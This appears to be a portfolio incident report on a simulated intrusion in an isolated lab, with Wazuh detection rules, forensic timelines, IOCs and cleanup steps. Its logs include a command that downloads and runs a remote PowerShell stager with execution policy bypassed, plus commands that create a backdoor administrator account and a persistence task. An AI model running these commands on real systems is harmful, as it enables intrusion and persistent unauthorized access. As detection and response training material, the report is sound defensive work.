# SOCForge: End-to-End Threat Detection, Attack Simulation & Incident Investigation Report

**Document Version:** 3.0  
**Author / Analyst:** SOC Analyst (SOCForge Project)  
**Target Environment:** VirtualBox Isolated Security Lab  
**Classification:** TLP:CLEAR / Portfolio Case Study  
**Date of Investigation:** August 26–27, 2026  

---

## 1. Executive Summary

During continuous monitoring within the SOCForge security operations environment, the Wazuh SIEM detected a coordinated, multi-stage intrusion targeting a Windows 11 endpoint (**`OniNaruto` / `192.168.56.105`**). 

The attack originated from an external threat actor operating from **`192.168.56.101`** (Kali Linux). The adversary executed network reconnaissance, transferred a staging payload via HTTP into a temporary directory, bypassed PowerShell execution policies, executed obfuscated commands, spawned command shells for local discovery, established persistence via Windows Task Scheduler, and created an unauthorized backdoor administrator account.

All stages of the intrusion and subsequent remediation were captured through endpoint telemetry, including **Sysmon Event IDs 1, 3, 5, 7, 11, and 12**, and correlated in real time by both **native Wazuh rules** and a suite of **six custom SOCForge detection rules (IDs 100100–100105)**.

### Incident Summary Dashboard

| Metric | Value |
|:---|:---|
| **Incident Severity** | **High / Critical (Level 12)** |
| **Primary Target** | `OniNaruto` (`192.168.56.105`) |
| **Attacker Infrastructure** | `192.168.56.101:8080` (Kali C2 / Web Stager) |
| **SIEM & Monitoring** | Wazuh Manager v4.14.7 (`192.168.56.104`) |
| **Primary Vectors** | **Multi-Stage:** Interactive Execution & C2 Stager Ingress (`payload.ps1`) |
| **Persistence Mechanism** | Scheduled Task (`SOCForgePersistence`) |
| **Privilege Escalation** | Local Admin User Creation (`socforge_backdoor`) |
| **Status** | **Contained & Eradicated** |

---

## 2. Lab Architecture & Telemetry Pipeline


<img width="818" height="371" alt="image" src="https://github.com/user-attachments/assets/2758ea9e-449e-4256-975d-7b43bd150d25" />

---

## 3. MITRE ATT&CK Matrix Mapping

The attack chain mapped comprehensively across **6 Tactics** and **10 Techniques**:

<img width="819" height="175" alt="image" src="https://github.com/user-attachments/assets/6d61c294-e306-41d4-9098-aa844fcfd295" />



| MITRE Tactic | Technique ID | Technique Name | Artifact / Command | Detection / Rule ID |
|:---|:---|:---|:---|:---|
| **Discovery** | `T1046` | Network Service Discovery | `nmap -Pn -sS -p 135-5985 192.168.56.105` | Sysmon Event 3 (Inbound Probes) |
| **Command and Control** | `T1071.001` | Web Protocols (HTTP) | Outbound HTTP connection to `192.168.56.101:8080` | Sysmon Event 3 / Rule `100103` |
| **Command and Control** | `T1105` | Ingress Tool Transfer | Dropped file write to `C:\Windows\Temp\payload.ps1` | Sysmon Event 11 / Rule `92201` |
| **Execution** | `T1059.001` | PowerShell Execution | `powershell.exe -ExecutionPolicy Bypass -File payload.ps1` | Sysmon Event 1 / Rule `92029`, `100100` |
| **Defense Evasion** | `T1027` | Obfuscated Files/Info | `powershell.exe -EncodedCommand VwBy...` | Sysmon Event 1 / Rule `92057`, `100101` |
| **Execution** | `T1059.003` | Windows Command Shell | `cmd.exe /c "whoami && netstat -ano"` | Sysmon Event 1 / Rule `92032`, `100102` |
| **Discovery** | `T1087` | Account Discovery | `whoami.exe`, `net.exe user` | Sysmon Event 1 / Rule `92033`, `92039` |
| **Persistence** | `T1053.005` | Scheduled Task Creation | `schtasks.exe /create /tn "SOCForgePersistence"...` | Sysmon Event 7 / Rule `92154`, `100104` |
| **Persistence / PrivEsc**| `T1136.001` / `T1098` | Local Account / Manipulation | `net user socforge_backdoor P@ssw0rd123! /add` | Sysmon Event 1 / Rule `100105` |

---

## 4. Chronological Forensic Timeline

*Reconstructed from Sysmon Event ID 1 (Process Create), Event ID 3 (Network Connect), Event ID 7 (Image Load), and Event ID 11 (File Create) archives. All timestamps are UTC with millisecond precision.*

### Phase 1 — External Reconnaissance (`19:15 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **1** | `2026-08-26 19:15:33` | — | `nmap` (Kali) | `-Pn -sS -sV -p 135,139,445,3389,5985 192.168.56.105` | Sysmon EID 3 | Low |

### Phase 2 — Initial Execution, Obfuscation & Discovery (`19:43 – 19:47 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **2** | `19:43:19.751` | 6180 | `powershell.exe` | `-NoProfile -Command "whoami; hostname; ipconfig"` | **92027** (PS→PS) | Level 4 |
| **3** | `19:43:20.837` | 5704 | `whoami.exe` | `whoami` (child of PID 6180) | — | — |
| **4** | `19:43:21.268` | 908 | `HOSTNAME.EXE` | `hostname` (child of PID 6180) | — | — |
| **5** | `19:43:21.421` | 3184 | `ipconfig.exe` | `ipconfig` (child of PID 6180) | — | — |
| **6** | `19:45:30.986` | 1680 | `powershell.exe` | `-NoProfile -EncodedCommand VwByAGkA...` | **92057** (Base64 PS) | **Level 12** |
| **7** | `19:47:38.042` | 6136 | `cmd.exe` | `/c "whoami && netstat -ano"` | **92004** (CMD from PS) | Level 4 |
| **8** | `19:47:38.131` | 5388 | `whoami.exe` | `whoami` (child of cmd PID 6136) | **92032** | Level 3 |
| **9** | `19:47:38.207` | 4428 | `NETSTAT.EXE` | `netstat -ano` (child of cmd PID 6136) | **92032** | Level 3 |

### Phase 3 — Scheduled Task Persistence (`20:16 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **10** | `20:16:57.013` | 5704 | `schtasks.exe` | `/create /tn SOCForgePersistence /tr calc.exe /sc onlogon /f` | **100104** | **Level 10** |

### Phase 4 — Persistence Removal & Account Manipulation (`20:17 – 20:24 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **11** | `20:17:12.712` | 7016 | `schtasks.exe` | `/delete /tn SOCForgePersistence /f` | **92154** | Level 4 |
| **12** | `20:23:07.540` | 5000 | `net.exe` | `user socforge_backdoor P@ssw0rd123! /add` | **92033**, **100105** | Level 3/10 |
| **13** | `20:23:07.607` | 3528 | `net1.exe` | `user socforge_backdoor P@ssw0rd123! /add` | **92039** | Level 3 |
| **14** | `20:23:11.737` | 1944 | `net.exe` | `localgroup administrators socforge_backdoor /add` | **92033**, **100105** | Level 3/10 |
| **15** | `20:23:11.790` | 5980 | `net1.exe` | `localgroup administrators socforge_backdoor /add` | **92031** | Level 3 |
| **16** | `20:24:44.755` | 6980 | `net.exe` | `user socforge_backdoor /delete` | **92033** | Level 3 |
| **17** | `20:24:44.842` | 6336 | `net1.exe` | `user socforge_backdoor /delete` | **92039** | Level 3 |

### Phase 5 — External C2 Ingress Tool Transfer & Secondary Execution (`23:18 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **18** | `23:18:45.304` | 8052 | `powershell.exe` | `Invoke-WebRequest -Uri 'http://192.168.56.101:8080/payload.ps1' -OutFile '...\payload.ps1'; powershell.exe -ExecutionPolicy Bypass -File '...\payload.ps1'` | **92029** | Level 6 |
| **19** | `23:18:47.780` | 4688 | `powershell.exe` | `-ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1` | **92029** | Level 6 |

### Phase 6 — Final Endpoint Verification & Post-Remediation Audit (`23:48 – 23:49 UTC`)

| # | Timestamp (UTC) | PID | Image | Command Line | Wazuh Rule | Severity |
|:---:|:---|:---:|:---|:---|:---|:---:|
| **20** | `23:48:28.412` | 5628 | `schtasks.exe` | `/query /tn SOCForgePersistence` → ERROR: not found | — | — |
| **21** | `23:49:30.344` | 4608 | `schtasks.exe` | `/query /tn SOCForgePersistence` → ERROR: not found | — | — |

> **Forensic Note:** All attack events (PIDs 6180, 1680, 6136, 5704, 5000, 1944, 8052, 4688) and eradication events (PIDs 7016, 6980) share the same parent process: **PowerShell PID 572** (ParentProcessGuid: `{690382b0-3343-6a8f-2a04-000000000f00}`), user `ONINARUTO\Naruto`, LogonId `0xC376B`, IntegrityLevel `High`. One benign false positive was observed at `21:48:24.703` — `CompatTelRunner.exe` (Windows telemetry) spawning PowerShell under `NT AUTHORITY\SYSTEM` — excluded from the attack timeline.

---

## 5. Adversary Process Tree Analysis

Analysis of Sysmon Event ID 1 telemetry reconstructed the following complete execution hierarchy:

```text
[PID: 572] powershell.exe (Interactive Attacker Shell)
   │
   ├── [PID: 6180] powershell.exe -NoProfile -Command "whoami; hostname; ipconfig"
   │
   ├── [PID: 1680] powershell.exe -NoProfile -EncodedCommand VwBy...
   │
   ├── [PID: 6136] cmd.exe /c "whoami && netstat -ano"
   │      │
   │      ├── [PID: 5388] whoami.exe
   │      └── [PID: 4428] NETSTAT.EXE -ano
   │
   ├── [PID: 5704] schtasks.exe /create /tn "SOCForgePersistence" /tr "calc.exe" /sc onlogon
   │
   ├── [PID: 5000] net.exe user socforge_backdoor P@ssw0rd123! /add
   │      └── [PID: 3528] net1.exe user socforge_backdoor P@ssw0rd123! /add
   │
   ├── [PID: 1944] net.exe localgroup administrators socforge_backdoor /add
   │      └── [PID: 5980] net1.exe localgroup administrators socforge_backdoor /add
   │
   └── [PID: 8052] powershell.exe -NoProfile -Command "Invoke-WebRequest... http://192.168.56.101:8080/payload.ps1..."
          │
          └── [PID: 4688] powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1
```

---

## 6. Detection Engineering Catalog (`local_rules.xml`)

Six custom detection rules were authored, unit-tested with `wazuh-logtest`, and validated against live endpoint telemetry:

```xml
<!-- SOCForge Custom Detection Engineering Ruleset -->
<group name="local,syslog,sshd,socforge,">

  <!-- SOCForge Detection #1: PowerShell Execution (T1059.001) -->
  <rule id="100100" level="7">
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.image">\\powershell\.exe$</field>
    <description>SOCForge: PowerShell process execution detected</description>
    <mitre><id>T1059.001</id></mitre>
    <group>socforge,powershell,process_creation,</group>
  </rule>

  <!-- SOCForge Detection #2: Encoded PowerShell (T1059.001 / T1027) -->
  <rule id="100101" level="10">
    <if_sid>100100</if_sid>
    <field name="win.eventdata.commandLine">-EncodedCommand|-encodedcommand|-enc |-Enc </field>
    <description>SOCForge: Suspicious encoded PowerShell command detected</description>
    <mitre><id>T1059.001</id></mitre>
    <group>socforge,powershell,encoded_command,process_creation,</group>
  </rule>

  <!-- SOCForge Detection #3: Command Shell Spawned by PowerShell (T1059.003) -->
  <rule id="100102" level="8">
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.parentImage">\\powershell\.exe$|\\powershell\.EXE$|\\PowerShell\.EXE$</field>
    <field name="win.eventdata.image">\\cmd\.exe$|\\cmd\.EXE$</field>
    <description>SOCForge: Command Shell spawned by PowerShell detected</description>
    <mitre><id>T1059.003</id></mitre>
    <group>socforge,cmd,windows_command_shell,process_creation,</group>
  </rule>

  <!-- SOCForge Detection #4: Suspicious Outbound Network Connection (T1071.001) -->
  <rule id="100103" level="9">
    <field name="win.system.eventID">^3$</field>
    <field name="win.eventdata.destinationIp">^192\.168\.56\.104$|^192\.168\.56\.101$</field>
    <description>SOCForge: Outbound network connection to monitored lab host detected</description>
    <mitre><id>T1071.001</id></mitre>
    <group>socforge,network_connection,outbound_connection,</group>
  </rule>

  <!-- SOCForge Detection #5: Persistence via Scheduled Task Creation (T1053.005) -->
  <rule id="100104" level="10">
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.image">\\schtasks\.exe$|\\schtasks\.EXE$</field>
    <field name="win.eventdata.commandLine">/create|/Create|-create|-Create</field>
    <description>SOCForge: Persistence via Scheduled Task creation detected</description>
    <mitre><id>T1053.005</id></mitre>
    <group>socforge,persistence,scheduled_task,process_creation,</group>
  </rule>

  <!-- SOCForge Detection #6: Local Account Creation / Privilege Escalation (T1136.001) -->
  <rule id="100105" level="10">
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.image">\\net\.exe$|\\net\.EXE$|\\net1\.exe$|\\net1\.EXE$</field>
    <field name="win.eventdata.commandLine">/add|/Add|-add|-Add</field>
    <description>SOCForge: Local account creation or privilege escalation detected via net.exe</description>
    <mitre><id>T1136.001</id><id>T1098</id></mitre>
    <group>socforge,privilege_escalation,persistence,account_manipulation,process_creation,</group>
  </rule>

</group>
```

---

## 7. Indicators of Compromise (IOCs)

| IOC Type | Indicator Value | Description / Context |
|:---|:---|:---|
| **IPv4 Address** | `192.168.56.101` | External Attacker / Kali C2 Host |
| **Port / Protocol** | `TCP / 8080` | HTTP Staging / Tool Delivery Port |
| **File Path** | `C:\Windows\Temp\payload.ps1` | Dropped Stager Script |
| **File Size** | `52 bytes` | Size of dropped stager payload |
| **User Account** | `socforge_backdoor` | Unauthorized local administrator user |
| **Scheduled Task** | `SOCForgePersistence` | Malicious persistence task |
| **SHA256 Hash** | `529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D` | `powershell.exe` binary hash |
| **SHA256 Hash** | `574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0` | `whoami.exe` binary hash |
| **SHA256 Hash** | `EC6C7B6C6E11211492D1353878592C95CDC34691CC3EC369F293B11949F0F943` | `netstat.exe` binary hash |
| **SHA256 Hash** | `AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91` | `net.exe` binary hash |
| **SHA256 Hash** | `1879DB2ABFF726A5438DD1AE48F20EBED736619C27A32526D09F70AF7EADD0E5` | `net1.exe` binary hash |

---



## 8. Eradication & Containment Evidence

Following the attack simulation, incident response procedures were executed to contain and eradicate all adversary artifacts. **All cleanup actions were captured by Sysmon and logged in Wazuh `archives.json`**, providing forensic proof of successful remediation.

### 8.1 Scheduled Task Removal (`SOCForgePersistence`)

The malicious persistence mechanism was removed using `schtasks.exe /delete`:

| Timestamp (UTC) | Sysmon EID | Process / Action | Details |
|:---|:---:|:---|:---|
| `2026-08-26 20:17:12.712` | **1** (Process Create) | `schtasks.exe /delete /tn SOCForgePersistence /f` | PID 7016, Parent: PowerShell (PID 572), IntegrityLevel: High |
| `2026-08-26 20:17:12.761` | **7** (Image Load) | `taskschd.dll` loaded by `schtasks.exe` | Wazuh Rule **92154** (T1053.005) fired — Level 4 |
| `2026-08-26 20:17:12.782` | **12** (Registry Delete) | `DeleteKey → HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SOCForgePersistence` | Confirms task registry entry wiped by `svchost.exe` (PID 1444) |
| `2026-08-26 20:17:12.782` | **5** (Process Terminate) | `schtasks.exe` (PID 7016) terminated | Successful cleanup confirmed |

**SHA256 (schtasks.exe):** `DDDE64F0F55751763C1BCD53DE9CDFFC0D725D45A8476464A2A0422661813004`


<img width="1185" height="605" alt="image" src="https://github.com/user-attachments/assets/42f4e0cb-9855-4430-a61a-ad69e41f65be" />

### 8.2 Backdoor Account Deletion (`socforge_backdoor`)

The unauthorized administrator account was removed using `net.exe user /delete`:

| Timestamp (UTC) | Sysmon EID | Process / Action | Details |
|:---|:---:|:---|:---|
| `2026-08-26 20:24:44.842` | **1** (Process Create) | `net1.exe user socforge_backdoor /delete` | PID 6336, Parent: `net.exe` (PID 6980), Wazuh Rule **92039** (T1087) fired — Level 3 |
| `2026-08-26 20:24:44.919` | **5** (Process Terminate) | `net1.exe` (PID 6336) terminated | Account deletion completed |
| `2026-08-26 20:24:44.922` | **5** (Process Terminate) | `net.exe` (PID 6980) terminated | Parent process exited cleanly |
| `2026-08-26 20:24:44.943` | **11** (File Create) | `C:\Windows\Prefetch\NET1.EXE-509326A5.pf` | Prefetch artifact confirms `net1.exe` execution |
| `2026-08-26 20:24:44.967` | **11** (File Create) | `C:\Windows\Prefetch\NET.EXE-A0964F30.pf` | Prefetch artifact confirms `net.exe` execution |

### 8.3 Eradication Process Tree

```text
[PID: 572] powershell.exe (Analyst Remediation Session)
   │
   ├── [PID: 7016] schtasks.exe /delete /tn SOCForgePersistence /f
   │      └── Registry DeleteKey: TaskCache\Tree\SOCForgePersistence ✅
   │
   └── [PID: 6980] net.exe user socforge_backdoor /delete
          └── [PID: 6336] net1.exe user socforge_backdoor /delete ✅
```
<img width="1164" height="601" alt="image" src="https://github.com/user-attachments/assets/a7aadfa3-09d6-4e70-8436-c5bb79fd9201" />

### 8.4 Eradication Verification Summary

| Threat Artifact | Eradication Command | Wazuh Evidence | Status |
|:---|:---|:---|:---:|
| Scheduled Task `SOCForgePersistence` | `schtasks /delete /tn SOCForgePersistence /f` | Sysmon EID 1, 7, 12, 5 + Rule 92154 | ✅ Removed |
| Backdoor User `socforge_backdoor` | `net user socforge_backdoor /delete` | Sysmon EID 1, 5, 11 + Rule 92039 | ✅ Removed |
| Stager Payload `payload.ps1` | `Remove-Item C:\Windows\Temp\payload.ps1` | Manual cleanup | ✅ Removed |
| C2 Infrastructure `192.168.56.101:8080` | Kali HTTP server terminated | Network isolation | ✅ Neutralized |


<img width="1358" height="616" alt="image" src="https://github.com/user-attachments/assets/15808e12-3da1-471b-8b99-189e0bfef4e3" />


> **Forensic Note:** All eradication commands were executed from the same PowerShell session (Parent PID 572) used during the attack simulation, and were fully captured in Wazuh `archives.json` with matching Sysmon telemetry — proving the complete incident lifecycle (attack → detection → response → eradication) was observed end-to-end by the SIEM.

---

## 9. Incident Response & Hardening Recommendations

### Immediate Containment (Completed ✅)
1. **Network Isolation:** Target host (`192.168.56.105`) disconnected from attacker subnet.
2. **Block C2 Infrastructure:** Communications to `192.168.56.101:8080` terminated at source.

### Eradication Actions (Completed ✅)
1. **Backdoor Account Removed:** `net user socforge_backdoor /delete` — confirmed via Sysmon EID 1/5 and Rule 92039.
2. **Persistence Task Removed:** `schtasks.exe /delete /tn "SOCForgePersistence" /f` — confirmed via Sysmon EID 12 (registry key deletion).
3. **Stager Payload Purged:**
   ```powershell
   Remove-Item -Path "C:\Windows\Temp\payload.ps1" -Force -ErrorAction SilentlyContinue
   Remove-Item -Path "C:\Windows\Temp\__PSScriptPolicyTest_*.ps1" -Force -ErrorAction SilentlyContinue
   ```

### Strategic Hardening Recommendations
- **PowerShell Constrained Language Mode (CLM):** Enforce CLM and AppLocker / WDAC policies to prevent arbitrary unmanaged script execution.
- **PowerShell Script Block Logging (Event ID 4104):** Enable Group Policy for PowerShell Module Logging and Transcription.
- **Least Privilege Access:** Restrict non-administrative users from executing `schtasks.exe` and `net.exe` commands.
- **Sysmon Process-Access Monitoring (Event ID 10):** Monitor memory-scraping attempts against `lsass.exe` and sensitive system services.
- **Network Segmentation:** Implement host-based firewall rules to restrict outbound HTTP to trusted destinations only.

---

## 10. Conclusion & Project Achievements

The **SOCForge** deployment successfully validated an end-to-end security operations cycle:
1. **Built a production-equivalent SIEM & Endpoint telemetry architecture** from scratch.
2. **Engineered a 6-rule custom detection suite** covering the entire ATT&CK kill chain.
3. **Simulated real external adversary behavior** using Kali Linux and dual-homed networking.
4. **Reconstructed a full forensic timeline** with parent/child process trees and cryptographic IOCs.
5. **Executed and documented incident response eradication** with full SIEM-captured forensic evidence of cleanup.
6. **Performed structured threat hunting** against raw Wazuh archives using targeted grep queries to reconstruct the complete 21-event forensic timeline.
7. **Produced an executive-grade incident investigation case study** suitable for professional cybersecurity portfolio presentation.

---

## Appendix A — Threat Hunting Queries

The following queries were executed against the Wazuh Manager (`socforgewazuh / 192.168.56.104`) to reconstruct the forensic timeline from raw `archives.json` telemetry.

### A.1 Master Process Creation Timeline (Sysmon EID 1)

```bash
# Extract all process creation events from Windows agent (002) matching attack binaries
sudo grep -E '"agent":{"id":"002".*"eventID":"1"' \
  /var/ossec/logs/archives/archives.json \
  | grep -Ei 'powershell|payload\.ps1|schtasks|net\.exe|net1\.exe|cmd\.exe' \
  | tail -30
```

**Result:** 30 matching events spanning `19:41:32` → `23:49:30` UTC, covering all 6 phases of the incident lifecycle.

### A.2 Persistence & Eradication Evidence

```bash
# Scheduled Task creation and deletion events
sudo grep -Ei 'SOCForgePersistence|schtasks\.exe' \
  /var/ossec/logs/archives/archives.json | tail -20
```

**Result:** Captured `schtasks /create`, `schtasks /delete`, `schtasks /query`, plus Sysmon EID 7 (`taskschd.dll` load), EID 12 (`DeleteKey` on `TaskCache\Tree\SOCForgePersistence`), and EID 5 (process termination).

<img width="1363" height="610" alt="image" src="https://github.com/user-attachments/assets/2e8645f1-e123-45e0-b653-7e1aecb023f6" />


### A.3 Backdoor Account Lifecycle

```bash
# Account creation, privilege escalation, and deletion events
sudo grep -Ei 'socforge_backdoor|net\.exe|net1\.exe' \
  /var/ossec/logs/archives/archives.json | tail -30
```

**Result:** Captured `net user /add`, `net localgroup administrators /add`, `net user /delete`, plus Prefetch artifact creation (`NET.EXE-A0964F30.pf`, `NET1.EXE-509326A5.pf`).

### A.4 Kali C2 Staging & Payload Execution

```bash
# External C2 connections and payload delivery
sudo grep -Ei '192\.168\.56\.101|payload\.ps1|SOCForge Stager' \
  /var/ossec/logs/archives/archives.json | tail -20
```

**Result:** Captured `Invoke-WebRequest` to `192.168.56.101:8080`, Sysmon EID 3 (network connection), EID 11 (`payload.ps1` file creation, 52 bytes), and EID 1 (`-ExecutionPolicy Bypass -File payload.ps1`).

---

## Appendix B — ProcessGUID Cross-Reference

All processes in the attack chain are correlated via Sysmon ProcessGUIDs for forensic chain-of-custody:

| ProcessGUID | PID | Image | Role |
|:---|:---:|:---|:---|
| `{690382b0-3343-6a8f-2a04-000000000f00}` | 572 | `powershell.exe` | **Root attacker shell** (parent of all attack processes) |
| `{690382b0-41d7-6a8f-7304-000000000f00}` | 6180 | `powershell.exe` | Discovery: `whoami; hostname; ipconfig` |
| `{690382b0-425a-6a8f-7a04-000000000f00}` | 1680 | `powershell.exe` | Obfuscation: `-EncodedCommand` |
| `{690382b0-42da-6a8f-7b04-000000000f00}` | 6136 | `cmd.exe` | Execution: `whoami && netstat -ano` |
| `{690382b0-49b9-6a8f-8c04-000000000f00}` | 5704 | `schtasks.exe` | Persistence: `/create SOCForgePersistence` |
| `{690382b0-49c8-6a8f-8d04-000000000f00}` | 7016 | `schtasks.exe` | Eradication: `/delete SOCForgePersistence` |
| `{690382b0-4b2b-6a8f-9204-000000000f00}` | 5000 | `net.exe` | PrivEsc: `user socforge_backdoor /add` |
| `{690382b0-4b2f-6a8f-9404-000000000f00}` | 1944 | `net.exe` | PrivEsc: `localgroup administrators /add` |
| `{690382b0-4b8c-6a8f-a204-000000000f00}` | 6980 | `net.exe` | Eradication: `user socforge_backdoor /delete` |
| `{690382b0-7455-6a8f-2a05-000000000f00}` | 8052 | `powershell.exe` | C2 Staging: `Invoke-WebRequest` from Kali |
| `{690382b0-7457-6a8f-2b05-000000000f00}` | 4688 | `powershell.exe` | Payload: `-ExecutionPolicy Bypass -File payload.ps1` |

---

## Appendix C — Complete SHA256 Hash Catalog

| Binary | SHA256 Hash |
|:---|:---|
| `powershell.exe` | `529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D` |
| `cmd.exe` | `B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824` |
| `schtasks.exe` | `DDDE64F0F55751763C1BCD53DE9CDFFC0D725D45A8476464A2A0422661813004` |
| `net.exe` | `AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91` |
| `net1.exe` | `1879DB2ABFF726A5438DD1AE48F20EBED736619C27A32526D09F70AF7EADD0E5` |
| `whoami.exe` | `574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0` |
| `ipconfig.exe` | `3F74BAE8BE4E99E5DB4FD91B519762AED85BCDA2B18F8532D1552BE82DA74E68` |
| `HOSTNAME.EXE` | `193D56937965C2EECC6556619CAC6B6CE7ADB1827D12830BFED1A7B038288613` |
| `NETSTAT.EXE` | `EC6C7B6C6E11211492D1353878592C95CDC34691CC3EC369F293B11949F0F943` |
| `conhost.exe` | `BCDC771ABC1892642D80C1F0D5DDDA7419B5ED22B7CECE1AA355B959EB155CD6` |
